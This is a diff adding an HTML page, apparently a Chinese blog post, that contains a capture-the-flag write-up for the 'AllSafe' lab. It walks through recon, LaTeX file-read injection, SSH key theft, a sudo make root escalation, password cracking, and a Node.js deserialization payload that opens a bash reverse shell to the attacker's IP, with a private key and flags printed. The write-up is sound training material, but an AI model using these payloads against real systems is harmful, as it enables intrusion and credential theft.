@@ -1,0 +1,2017 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="github-light" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://7r1UMPHK.github.io/css/primer.css' rel='stylesheet' />
+    <script src='https://7r1UMPHK.github.io/plugins/theme.js'></script><script data-goatcounter='https://7r1umphk.goatcounter.com/count' async src='https://7r1UMPHK.github.io/plugins/count.js'></script>
+    <link rel="icon" href="https://7r1UMPHK.github.io/image/20250320200557660.ico">
+<meta name="description" content="# 1. **信息收集阶段**
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ sudo arp-scan -l         
+...
+192.168.205.136 08:00:27:e0:05:50       (Unknown)
+...
+```
+
+发现目标主机 192.168.205.136
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ nmap -p0-65535 192.168.205.136         
+...
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+2222/tcp open  EtherNetIP-1
+ 
+┌──(kali㉿kali)-[~]
+└─$ nmap -p2222 -sC -sV 192.168.205.136                                   
+...
+PORT     STATE SERVICE VERSION
+2222/tcp open  ssh     OpenSSH 10.0p2 Debian 7 (protocol 2.0)
+```
+
+开放端口：22(SSH), 80(HTTP), 2222(SSH)
+
+# 2. **域名发现**
+
+![image-20251019113144223](http://7r1UMPHK.github.io/image/20251019145556227.webp)
+
+源码中发现域名 http://allsafe.thl/
+
+添加hosts并爆破子域名
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ sudo vim /etc/hosts             
+
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ tail -n 1 /etc/hosts                         
+192.168.205.136 allsafe.thl
+                        
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ wfuzz -c -u 'http://allsafe.thl' -H 'HOST:FUZZ.allsafe.thl' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 560
+...
+000000058:   302      0 L     0 W        0 Ch        'intranet - intranet'   
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ sudo vim /etc/hosts
+
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ tail -n 1 /etc/hosts
+192.168.205.136 allsafe.thl intranet.allsafe.thl
+```
+
+发现子域：`intranet.allsafe.thl`
+
+![image-20251019113617538](http://7r1UMPHK.github.io/image/20251019145556489.webp)
+
+需要一个id和密码，去主域看看
+
+# 3. **目录扫描**
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ dirsearch -q -u 192.168.205.136        
+...
+[11:30:06] 200 -  477B  - http://192.168.205.136/assets/
+[11:30:06] 301 -  319B  - http://192.168.205.136/assets  ->  http://192.168.205.136/assets/
+[11:30:07] 200 -    1KB - http://192.168.205.136/contact.php
+[11:30:08] 301 -  319B  - http://192.168.205.136/images  ->  http://192.168.205.136/images/
+[11:30:08] 200 -  684B  - http://192.168.205.136/images/
+[11:30:11] 403 -  280B  - http://192.168.205.136/server-status
+[11:30:11] 403 -  280B  - http://192.168.205.136/server-status/
+[11:30:13] 301 -  318B  - http://192.168.205.136/views  ->  http://192.168.205.136/views/
+```
+
+![image-20251019113726312](http://7r1UMPHK.github.io/image/20251019145553712.webp)
+
+在`our-team.php`找到员工ID：04779990
+
+`contact.php`经过测试没有xxs,sql之类的
+
+扒拉一下intranet
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ dirsearch -q -u http://intranet.allsafe.thl 
+...
+[11:40:56] 200 -  485B  - http://intranet.allsafe.thl/assets/
+[11:40:56] 301 -  329B  - http://intranet.allsafe.thl/assets  ->  http://intranet.allsafe.thl/assets/
+[11:40:58] 200 -    0B  - http://intranet.allsafe.thl/db.php
+[11:40:58] 301 -  327B  - http://intranet.allsafe.thl/docs  ->  http://intranet.allsafe.thl/docs/
+[11:40:58] 200 -  405B  - http://intranet.allsafe.thl/docs/
+[11:40:59] 301 -  329B  - http://intranet.allsafe.thl/images  ->  http://intranet.allsafe.thl/images/
+[11:40:59] 200 -  455B  - http://intranet.allsafe.thl/images/
+[11:41:00] 200 -    1KB - http://intranet.allsafe.thl/login.php
+[11:41:02] 200 -  967B  - http://intranet.allsafe.thl/profile.php
+[11:41:02] 403 -  285B  - http://intranet.allsafe.thl/server-status
+[11:41:02] 403 -  285B  - http://intranet.allsafe.thl/server-status/
+[11:41:04] 301 -  328B  - http://intranet.allsafe.thl/views  ->  http://intranet.allsafe.thl/views/
+```
+
+`profile.php`没啥有价值的
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ gobuster dir -u http://intranet.allsafe.thl -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak -t 64
+...
+/images               (Status: 301) [Size: 329] [--> http://intranet.allsafe.thl/images/]
+/index.php            (Status: 302) [Size: 0] [--> login.php]
+/login.php            (Status: 200) [Size: 2075]
+/profile.php          (Status: 200) [Size: 2305]
+/docs                 (Status: 301) [Size: 327] [--> http://intranet.allsafe.thl/docs/]
+/assets               (Status: 301) [Size: 329] [--> http://intranet.allsafe.thl/assets/]
+/customers.php        (Status: 200) [Size: 11072]
+/db.php               (Status: 200) [Size: 0]
+/logout.php           (Status: 302) [Size: 0] [--> login.php]
+/process              (Status: 301) [Size: 330] [--> http://intranet.allsafe.thl/process/]
+/views                (Status: 301) [Size: 328] [--> http://intranet.allsafe.thl/views/]
+```
+
+`customers.php`发现大量用户信息，但是没有密码
+
+在`/process`目录下发现大量疑似生成文件夹
+
+![image-20251019114437353](http://7r1UMPHK.github.io/image/20251019145555722.webp)
+
+通过查看，发现是都是“服务合同”PDF的 LaTeX 生成文件
+
+![image-20251019114529533](http://7r1UMPHK.github.io/image/20251019145705736.webp)
+
+并且通过查看`document.tex`，发现可以读取敏感信息
+
+![image-20251019114642753](http://7r1UMPHK.github.io/image/20251019145557800.webp)
+
+查看了全部的pdf，都是passwd文件或者id_rsa文件，id_rsa文件都是失效的，通过passwd收获两个用户名`goddard` 和`parker`
+
+结合目前的信息来看，需要先进入intranet子域的系统，继续信息收集
+
+收集了好一会，搁置了几天，因为实在找不到，后面我看到有人写wp了，瞄瞄
+
+# 4. **SSRF漏洞利用**
+
+*ps:https://github.com/nohh022/writeups/blob/main/TheHackerLabs/AllSafe/AllSafe.md*
+
+![image-20251019115444746](http://7r1UMPHK.github.io/image/20251019145600866.webp)
+
+c，我试过了127.0.0.1不行，我还以为没有呢
+
+拿到一个密码`123456Seven`
+
+尝试登录
+
+然后这里有一个问题，我的火狐浏览器访问http://intranet.allsafe.thl/login.php会出不来，但是google浏览器可以，所以自己解决一下这个问题吧
+
+```
+0-477-9990
+123456Seven
+```
+
+登录成功
+
+![image-20251019115848173](http://7r1UMPHK.github.io/image/20251019145604630.webp)
+
+加载的也不是很完整，不管了能用就行
+
+# 5. **LaTeX注入读取SSH密钥**
+
+我们已知Empresa字段可以通过`\lstinputlisting{/etc/passwd}`读取文件，我们尝试读取那两个用户的ssh私钥
+
+![image-20251019121327471](http://7r1UMPHK.github.io/image/20251019145711830.webp)
+
+然后生成了，死活不出东西，我去看process的生成文件，发现
+
+![image-20251019121410361](http://7r1UMPHK.github.io/image/20251019145609790.webp)
+
+![image-20251019121428663](http://7r1UMPHK.github.io/image/20251019145613131.webp)
+
+他前端搞反了，我们也调整一下
+
+![image-20251019120804269](http://7r1UMPHK.github.io/image/20251019145614798.webp)
+
+parker的也类似
+
+![image-20251019120956589](http://7r1UMPHK.github.io/image/20251019145620203.webp)
+
+parker的私钥出货了
+
+![image-20251019121518491](http://7r1UMPHK.github.io/image/20251019145622259.webp)
+
+直接复制出来的是有问题的，我们慢慢处理一下
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ vim /tmp/id_rsa 
+                                                                           
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ cat /tmp/id_rsa | sed '1b; $b; s/ //g' > /tmp/id_rsa1
+                                                                           
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ chmod 600 /tmp/id_rsa1                               
+                                                                           
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ ssh-keygen -y -f /tmp/id_rsa1   
+Load key '/tmp/id_rsa1': error in libcrypto
+                                                                           
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ cat -A /tmp/id_rsa1
+M-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^RBEGIN OPENSSH PRIVATE KEYM-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^R$
+...
+M-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^REND OPENSSH PRIVATE KEYM-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^R$
+```
+
+头尾问题，去复制一个标准的就好了
+
+完美的id_rsa
+
+```
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAQEAmGqHh2o84MpOxktbDf6ENwqdz7xQ4XqZbut/nxIfpevyszfP0kOM
+edI2pX+vZVVTzxJ3GumZYArNWeFScOI90ZCU8bylIihC0i/450XzzN86SgNkOeFIjK5uiU
+78ATZwuJVqRNspyAg4qpohBt43SiJ2ILL75u5lPBzFX9rfeW9kpxU+nuR6P/wTpcqFgZWT
+TuSwfEudYAmBOtG01hrfgtVZzBZ8eqNCjIZmx7HQkeny+sOMdTwkKp8PuBqMyag4E/PYFR
+HF7MunDmbvh0V163FatZYQippXsr3iTt7NT0qOxqNk+kvvWWbbRGBN9VHDByyNC20Hj7W0
+RALgwYDmrwAAA8gz5lrPM+ZazwAAAAdzc2gtcnNhAAABAQCYaoeHajzgyk7GS1sN/oQ3Cp
+3PvFDheplu63+fEh+l6/KzN8/SQ4x50jalf69lVVPPEnca6ZlgCs1Z4VJw4j3RkJTxvKUi
+KELSL/jnRfPM3zpKA2Q54UiMrm6JTvwBNnC4lWpE2ynICDiqmiEG3jdKInYgsvvm7mU8HM
+Vf2t95b2SnFT6e5Ho//BOlyoWBlZNO5LB8S51gCYE60bTWGt+C1VnMFnx6o0KMhmbHsdCR
+6fL6w4x1PCQqnw+4GozJqDgT89gVEcXsy6cOZu+HRXXrcVq1lhCKmleyveJO3s1PSo7Go2
+T6S+9ZZttEYE31UcMHLI0LbQePtbREAuDBgOavAAAAAwEAAQAAAQA7FUi2YKN6zFHfIoUI
+lrowEAh+59Q+o+Toj5foVQE5s45glOkV7CN/cdLHMwkN8hbL9a+AGj/fcDCMgAESS1GFdF
+OYpfUpmYvVqM0G8iIBMCOLX2cx3Lff+RpWVezwl2b41srcKE05Ap7c22SkIe4y6cr7AAcQ
+TSenNsv4TYNFsiRzVDUwISqlp3EhFWPe1GClasPahS3pEDcNiMwRh8mPt7HRG9HqLEPhWv
+9qTpoCnnc30s4Wo9QipdtcxvHrrEPVVrwcz3SJnlCLTlYjiBHZ+gGBl73crSZJOlxNAiow
+A85FBKi6FrWaA3WXrKdCFEh3atKGg5I8kCGhxBkpjn8ZAAAAgCo8745ADp4U7gibCuKs5N
+g7JYWuJDZCYyEClHkWJYdb6CluTJx9DOw0i28Ip8FM8P0YQclTMlU21pwVj1eVXk/5D3kg
+bsBO4hfcSoqewOG0H5U44aiey01z38kz0PL6Z/6JGMzEuSvlHKTJgCGaQSrFcC1X/57LOp
+pViYAqrNC5AAAAgQDPNORYZS8OywkcFN2LZe3uHa4EFZPytnzcPcnQeGWwVqm/12D10vPR
+yeTA0lvIKYkWcClPmiM3/CFQdWPwTyMGryyMv+5+lVJEi0dfHa02jCYKH87pVH35UF6ZPB
+TgvhsrQRFX12vSk/DO30Aa15P/GT4XceHEdM6GlXkOBtILjQAAAIEAvE6vGGynNroa34mv
+cuLE4hu5zK8t167MUX6zNgPDmmoUTwHIRL43ErUo+KpQf1yS3S70Q6xfTQjaxo9S5QuQMR
+CsEojTarhvJ7+VxSKpjjju9Nmuxd2d2vrEPTgrOSijimjkjWK6OhZgemGoKoDUpOf2j8kv
+mKzxF43kdEiETisAAAARcm9vdEAwOTk2MGRmYjE3OGUBAg==
+-----END OPENSSH PRIVATE KEY-----
+```
+
+# 6. **SSH登录与横向移动**
+
+尝试利用
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ vim /tmp/id_rsa
+                       
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ chmod 600 /tmp/id_rsa 
+                                                                           
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ ssh-keygen -y -f /tmp/id_rsa 
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCYaoeHajzgyk7GS1sN/oQ3Cp3PvFDheplu63+fEh+l6/KzN8/SQ4x50jalf69lVVPPEnca6ZlgCs1Z4VJw4j3RkJTxvKUiKELSL/jnRfPM3zpKA2Q54UiMrm6JTvwBNnC4lWpE2ynICDiqmiEG3jdKInYgsvvm7mU8HMVf2t95b2SnFT6e5Ho//BOlyoWBlZNO5LB8S51gCYE60bTWGt+C1VnMFnx6o0KMhmbHsdCR6fL6w4x1PCQqnw+4GozJqDgT89gVEcXsy6cOZu+HRXXrcVq1lhCKmleyveJO3s1PSo7Go2T6S+9ZZttEYE31UcMHLI0LbQePtbREAuDBgOav root@09960dfb178e
+                               
+┌──(kali㉿kali)-[/tmp]
+└─$ ssh parker@192.168.205.136  -i /tmp/id_rsa1
+parker@192.168.205.136's password: 
+
+┌──(kali㉿kali)-[/tmp]
+└─$ ssh parker@192.168.205.136 -p 2222 -i /tmp/id_rsa1
+parker@153504fd9bcb:~$ id
+uid=1001(parker) gid=1001(parker) groups=1001(parker)
+```
+
+横向移动
+
+```bash
+parker@153504fd9bcb:~$ cd
+parker@153504fd9bcb:~$ ls -al
+total 24
+drwx---r-x 1 parker parker 4096 Aug 24 18:39 .
+drwxr-xr-x 1 root   root   4096 Aug 24 18:39 ..
+-rw-r--r-- 1 parker parker  220 Jul 30 19:28 .bash_logout
+-rw-r--r-- 1 parker parker 3526 Jul 30 19:28 .bashrc
+-rw-r--r-- 1 parker parker  807 Jul 30 19:28 .profile
+drwxr-xr-x 1 parker parker 4096 Aug 24 18:39 .ssh
+parker@153504fd9bcb:~$ cd /home/
+parker@153504fd9bcb:/home$ ls -al
+total 16
+drwxr-xr-x 1 root    root    4096 Aug 24 18:39 .
+drwxr-xr-x 1 root    root    4096 Oct 11 18:41 ..
+drwx------ 2 goddard goddard 4096 Aug 24 18:39 goddard
+drwx---r-x 1 parker  parker  4096 Aug 24 18:39 parker
+parker@153504fd9bcb:/home$ find / -user $(whoami) ! -path '/proc/*' ! -path '/sys/*' ! -path '/run/*' 2>/dev/null
+/home/parker
+/home/parker/.ssh
+/home/parker/.ssh/id_rsa.pub
+/home/parker/.ssh/id_rsa
+/home/parker/.ssh/authorized_keys
+/home/parker/.bash_logout
+/home/parker/.bashrc
+/home/parker/.profile
+/dev/pts/0
+/var/mail/parker
+/var/mail/parker/meeting
+parker@153504fd9bcb:/home$ cd /var/mail/parker
+parker@153504fd9bcb:/var/mail/parker$ ls -la
+total 12
+drwxr-sr-x 2 parker parker 4096 Aug 24 18:39 .
+drwxrwsr-x 1 root   mail   4096 Aug 24 18:39 ..
+-rw-r--r-- 1 parker parker  898 Aug 24 18:39 meeting
+parker@153504fd9bcb:/var/mail/parker$ cat meeting
+From goddard@localhost Thu Aug 21 14:05:20 2025
+Date: Thu, 21 Aug 2025 14:05:20 +0000
+From: goddard@localhost
+To: parker@localhost
+Subject: Reunión con E-Corp
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary='BOUNDARY'
+
+--BOUNDARY
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+
+Hola Oliver,
+
+Te adjunto las notas que armé para la reunión con el cliente.  
+Revisalo y confirmame si llegamos con todo.
+
+Saludos,  
+Gideon
+
+--BOUNDARY
+Content-Type: text/plain; name='meeting_notes.txt'
+Content-Disposition: attachment; filename='meeting_notes.txt'
+Content-Transfer-Encoding: 7bit
+
+Meeting Notes - E-Corp
+----------------------
+1. Confirmar agenda con el cliente.
+2. Revisar documentación técnica.
+3. Validar acceso al portal con la credencial:
+
+   Clave de acceso: 6D7033386E71556654416130494D314F70306157
+
+4. Preparar demo corta del servicio.
+--BOUNDARY--
+EOF.          
+```
+
+利用https://gchq.github.io/CyberChef/ hex解出`mp38nqUfTAa0IM1Op0aW`
+
+# 7. **容器内提权**
+
+```bash
+parker@153504fd9bcb:/home$ su goddard
+Password: 
+goddard@153504fd9bcb:/home$ id
+uid=1000(goddard) gid=1000(goddard) groups=1000(goddard)
+goddard@153504fd9bcb:/home$ sudo -l
+Matching Defaults entries for goddard on 153504fd9bcb:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User goddard may run the following commands on 153504fd9bcb:
+    (ALL) NOPASSWD: /usr/bin/make
+```
+
+*ps:https://gtfobins.github.io/gtfobins/make/#sudo*
+
+```bash
+goddard@153504fd9bcb:/home$ sudo make -s --eval=$'x:\n\t-''/bin/bash'
+root@153504fd9bcb:/home# id
+uid=0(root) gid=0(root) groups=0(root)
+root@153504fd9bcb:/home# cd
+root@153504fd9bcb:~# ls -al
+total 24
+drwx------ 1 root root 4096 Aug 24 18:39 .
+drwxr-xr-x 1 root root 4096 Oct 11 18:41 ..
+-rw-r--r-- 1 root root  607 May 12 19:25 .bashrc
+-rw-r--r-- 1 root root  132 May 12 19:25 .profile
+drwx------ 2 root root 4096 Aug 24 18:38 .ssh
+-rw-r--r-- 1 root root 1656 Aug 22 16:02 secrets.psafe3
+```
+
+传去kali
+
+```bash
+root@153504fd9bcb:~# scp secrets.psafe3 kali@192.168.205.128:/mnt/hgfs/gx/x/tmp
+...
+secrets.psafe3                               100% 1656   749.5KB/s   00:00 
+```
+
+pwsafe查看
+
+![image-20251019125219858](http://7r1UMPHK.github.io/image/20251019145628481.webp)
+
+要密码，爆破一下
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ pwsafe2john secrets.psafe3 > hash
+                                                                           
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
+...
+rockandroll      (secret)     
+...
+```
+
+![image-20251019125504831](http://7r1UMPHK.github.io/image/20251019145630284.webp)
+
+获得cisco密码：`sMpam!dE#8@$$1P%bnV@fFxdqjFFG#`
+
+登录
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ ssh cisco@192.168.205.136
+cisco@192.168.205.136's password: 
+Linux allsafe 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64
+ █████╗ ██╗     ██╗     ███████╗ █████╗ ███████╗███████╗
+██╔══██╗██║     ██║     ██╔════╝██╔══██╗██╔════╝██╔════╝
+███████║██║     ██║     ███████╗███████║█████╗  █████╗  
+██╔══██║██║     ██║     ╚════██║██╔══██║██╔══╝  ██╔══╝  
+██║  ██║███████╗███████╗███████║██║  ██║██║     ███████╗
+╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝
+Last login: Fri Aug 22 23:59:20 2025 from 192.168.1.19
+cisco@allsafe:~$ id
+uid=1002(cisco) gid=1002(cisco) grupos=1002(cisco)
+cisco@allsafe:~$ sudo -l
+sudo: unable to resolve host allsafe: Nombre o servicio desconocido
+[sudo] contraseña para cisco: 
+Sorry, user cisco may not run sudo on allsafe.
+cisco@allsafe:~$ ls -al
+total 32
+drwxr-xr-x 2 cisco cisco 4096 oct 11 20:46 .
+drwxr-xr-x 4 root  root  4096 ago 21 15:30 ..
+lrwxrwxrwx 1 root  root     9 ago 22 17:20 .bash_history -> /dev/null
+-rw-r--r-- 1 cisco cisco  220 abr 23  2023 .bash_logout
+-rw-r--r-- 1 cisco cisco 3526 abr 23  2023 .bashrc
+-rw-r--r-- 1 root  root    37 ago 22 00:48 darkarmy.bin
+-rw-r--r-- 1 cisco cisco  807 abr 23  2023 .profile
+-rw-r--r-- 1 root  root   342 ago 22 00:38 .unknown
+-rw-r--r-- 1 root  root    33 oct 11 20:46 user.txt
+cisco@allsafe:~$ cat user.txt
+e8c459b5b46f5722effe5f2f64421ef3
+cisco@allsafe:~$ strings darkarmy.bin
+70617373776f72643d64726b32303235210a
+```
+
+CyberChef看了一下，还是hex，解除`password=drk2025!`
+
+密码都不对，骗人的
+
+```bash
+cisco@allsafe:~$ ss -tulnp        
+...
+tcp              LISTEN             0                  511                                127.0.0.1:3000                               0.0.0.0:*     ...                             
+cisco@allsafe:~$ ls- al
+-bash: ls-: orden no encontrada
+cisco@allsafe:~$ ls -al
+total 32
+drwxr-xr-x 2 cisco cisco 4096 oct 11 20:46 .
+drwxr-xr-x 4 root  root  4096 ago 21 15:30 ..
+lrwxrwxrwx 1 root  root     9 ago 22 17:20 .bash_history -> /dev/null
+-rw-r--r-- 1 cisco cisco  220 abr 23  2023 .bash_logout
+-rw-r--r-- 1 cisco cisco 3526 abr 23  2023 .bashrc
+-rw-r--r-- 1 root  root    37 ago 22 00:48 darkarmy.bin
+-rw-r--r-- 1 cisco cisco  807 abr 23  2023 .profile
+-rw-r--r-- 1 root  root   342 ago 22 00:38 .unknown
+-rw-r--r-- 1 root  root    33 oct 11 20:46 user.txt
+cisco@allsafe:~$ cat .unknown
+Si quieres comunicarte con nosotros, no vuelvas a usar los canales habituales.
+A partir de ahora, todo contacto será únicamente a través del canal seguro.
+
+Conéctate al servidor de mensajería y entra en la sala:
+    dark-ops
+
+No intentes usar este acceso para nada más que lo acordado.  
+Nosotros decidimos cuándo y cómo se conversa.
+```
+
+经过查看，端口3000是基于 Socket.IO 的聊天应用，我们转发出去
+
+# 8. **端口转发与日志分析**
+
+```bash
+cisco@allsafe:~$ busybox wget 192.168.205.128/socat
+Connecting to 192.168.205.128 (192.168.205.128:80)
+saving to 'socat'
+socat                100% |**********************************************************************************************************************************| 4724k  0:00:00 ETA
+'socat' saved
+cisco@allsafe:~$ chmod +x socat
+cisco@allsafe:~$ ./socat TCP-LISTEN:3001,fork TCP4:127.0.0.1:3000 &
+[1] 2001
+```
+
+没问题，可以访问
+
+![image-20251019130446534](http://7r1UMPHK.github.io/image/20251019145634052.webp)
+
+测试我们刚刚拿到了信息
+
+```
+Gideon
+dark-ops
+6D7033386E71556654416130494D314F70306157
+```
+
+不行，那就是还有东西我们没找到
+扒拉了一个查看修改时间的软件，发现了这个
+
+```bash
+/var/log/app.log         2025-08-22   -rwxr-xr-x         1654
+```
+
+我们可读
+
+```bash
+cisco@allsafe:/tmp$ cat /var/log/app.log
+2025-08-21T12:01:11.233Z [INFO] Server started on port 3000 (PID 2234)
+2025-08-21T12:01:11.235Z [DEBUG] Connected to MySQL at mysql-db:3306
+2025-08-21T12:01:12.004Z [WARN] DeprecationWarning: uuid.v1() is deprecated. Use uuid.v4()
+2025-08-21T12:01:13.551Z [INFO] GET /healthcheck 200 - 2ms
+2025-08-21T12:01:14.232Z [INFO] GET /favicon.ico 404 - 3ms
+2025-08-21T12:01:19.998Z [DEBUG] Cache miss for key: session:oparker
+2025-08-21T12:01:20.012Z [INFO] POST /login 401 - 45ms - user=oparker
+2025-08-21T12:01:20.014Z [ERROR] Invalid credentials for user=oparker ip=10.0.0.12
+
+2025-08-21T12:01:35.783Z [INFO] POST /auth 401 - 62ms - user=shadow
+2025-08-21T12:01:35.784Z [DEBUG] Authentication failed for user shadow using password=123456
+2025-08-21T12:01:36.001Z [WARN] Too many failed attempts for user=shadow from 10.0.0.55
+
+2025-08-21T12:01:40.152Z [INFO] POST /auth 200 - 38ms - user=cisco
+2025-08-21T12:01:40.153Z [DEBUG] Authentication success: password=DLFJYxLLSzp1x5Ttpsffpg2awuJT5K
+2025-08-21T12:01:40.155Z [INFO] Joined secure channel: dark-ops
+
+2025-08-21T12:01:41.998Z [DEBUG] Socket.io message from user=shadow: 'system ready'
+2025-08-21T12:01:42.112Z [INFO] GET /api/clients 200 - 14ms
+2025-08-21T12:01:43.550Z [ERROR] UnhandledPromiseRejectionWarning: TypeError: Cannot read property 'id' of undefined
+2025-08-21T12:01:43.551Z [INFO] Trace: at /srv/app/routes.js:77:19
+2025-08-21T12:01:44.992Z [DEBUG] Cache hit for key: client:ecorp
+2025-08-21T12:01:45.011Z [INFO] POST /reports/upload 500 - 132ms - user=parker
+2025-08-21T12:01:45.012Z [ERROR] Error: File too large (>5MB)
+2025-08-21T12:01:46.200Z [DEBUG] Session destroyed for user=oparker
+```
+
+分析/var/log/app.log获得认证信息
+
+```
+cisco
+dark-ops
+DLFJYxLLSzp1x5Ttpsffpg2awuJT5K
+```
+
+登录成功，我去中文？！
+
+![image-20251019130950990](http://7r1UMPHK.github.io/image/20251019145636883.webp)
+
+没啥东西，测试了ssti之类的也没啥东西
+
+抓个包看看
+
+```bash
+GET / HTTP/1.1
+Host: 192.168.205.136:3001
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Cookie: sess=eyJ1c2VybmFtZSI6ImNpc2NvIn0%3D
+Upgrade-Insecure-Requests: 1
+If-Modified-Since: Wed, 20 Aug 2025 13:34:08 GMT
+If-None-Match: W/'3ce-198c7afdc80'
+Priority: u=0, i
+```
+
+Cookie这个jwt也太短了吧
+
+![image-20251019131355893](http://7r1UMPHK.github.io/image/20251019145639751.webp)
+
+啊这，伪造也没啥价值
+
+问了波ai，说可能是 **Node.js反序列化漏洞**
+
+# **9. Node.js反序列化RCE**
+
+```json
+{
+  'username': '_$$ND_FUNC$$_function(){require('child_process').exec(\'bash -c 'bash -i >& /dev/tcp/192.168.205.128/8888 0>&1'\');}()'
+}
+```
+
+base编码+url编码
+
+```
+ew0KICAidXNlcm5hbWUiOiAiXyQkTkRfRlVOQyQkX2Z1bmN0aW9uKCl7cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoXCJiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMjA1LjEyOC84ODg4IDA%2BJjEnXCIpO30oKSINCn0%3D
+```
+
+kali监听
+
+关键利用包，替换到 Socket.IO 轮询请求
+
+```
+POST /socket.io/?EIO=4&transport=polling&t=a7m0hv65&sid=Zr2kizcum7IVICx8AAAc HTTP/1.1
+Host: 192.168.205.136:3001
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0
+Accept: */*
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate, br
+Content-type: text/plain;charset=UTF-8
+Content-Length: 49
+Origin: http://192.168.205.136:3001
+Connection: keep-alive
+Cookie: sess=ew0KICAidXNlcm5hbWUiOiAiXyQkTkRfRlVOQyQkX2Z1bmN0aW9uKCl7cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoXCJiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMjA1LjEyOC84ODg4IDA%2BJjEnXCIpO30oKSINCn0%3D
+
+40{'username':'anon','room':'general','token':''}
+```
+
+监听并获取反弹 shell：
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nc -lvnp 8888                                                                                                                                                                
+listening on [any] 8888 ...
+connect to [192.168.205.128] from (UNKNOWN) [192.168.205.136] 41224
+bash: no se puede establecer el grupo de proceso de terminal (377): Función ioctl no apropiada para el dispositivo
+bash: no hay control de trabajos en este shell
+root@allsafe:~/app/src# id
+id
+uid=0(root) gid=0(root) grupos=0(root)
+root@allsafe:~/app/src# cd  
+cd
+root@allsafe:~# cat /root/root.txt   
+cat /root/root.txt
+74d1b217518f030ed2c911f77413f394
+root@allsafe:~# find / -name 'user.txt' 2>/dev/null
+find / -name 'user.txt' 2>/dev/null
+/home/cisco/user.txt
+root@allsafe:~# cat /home/cisco/user.txt
+cat /home/cisco/user.txt
+e8c459b5b46f5722effe5f2f64421ef3
+```
+
+# 10. 聊聊
+
+thehackerslabs的强度又起来了，好事
+
+它的网址是：https://labs.thehackerslabs.com/ 
+
+想打的可以打打。">
+<meta property="og:title" content="thl_allsafe">
+<meta property="og:description" content="# 1. **信息收集阶段**
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ sudo arp-scan -l         
+...
+192.168.205.136 08:00:27:e0:05:50       (Unknown)
+...
+```
+
+发现目标主机 192.168.205.136
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ nmap -p0-65535 192.168.205.136         
+...
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+2222/tcp open  EtherNetIP-1
+ 
